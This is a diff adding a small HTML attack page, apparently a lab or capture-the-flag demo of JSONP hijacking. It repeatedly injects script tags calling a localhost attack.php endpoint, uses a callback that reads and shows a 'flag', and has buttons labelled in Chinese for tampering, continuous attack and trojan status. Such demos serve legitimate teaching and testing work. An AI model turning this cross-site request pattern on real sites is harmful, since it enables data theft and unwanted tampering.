@@ -1,0 +1,46 @@
+<html>
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>attack</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+<body>
+
+<script>
+
+var base_url = "http://127.0.0.1:8080/"
+
+function attack() {
+    var script = document.createElement("script");
+    script.setAttribute("src", base_url+"attack.php?attack=1&exist=0");
+    document.body.appendChild(script);
+}
+
+function attackC() {
+    setInterval("attack()",3000);
+}
+
+
+function callbackdata(result) {
+    alert(result.flag);
+}
+
+</script>
+
+<script type="text/javascript" src="http://127.0.0.1:8080/attack.php/?attack=0&exist=1&callback=callbackdata"></script>
+
+
+<!--攻击模块-->
+
+<p><input type="button" onclick="attack();" value="恶意篡改"><br></p>
+<p><input type="button" onclick="attackC();" value="连续攻击"><br></p>
+
+<!--测试连通性-->
+<p><input type="button" onclick=location.reload(); value="木马状态"><br></p>
+
+<!--DEMO 展示-->
+<p><a href="http://127.0.0.1:8080/about/overview.php" target="_blank">Overview Page</a></p>
+
+</body>
+</html>
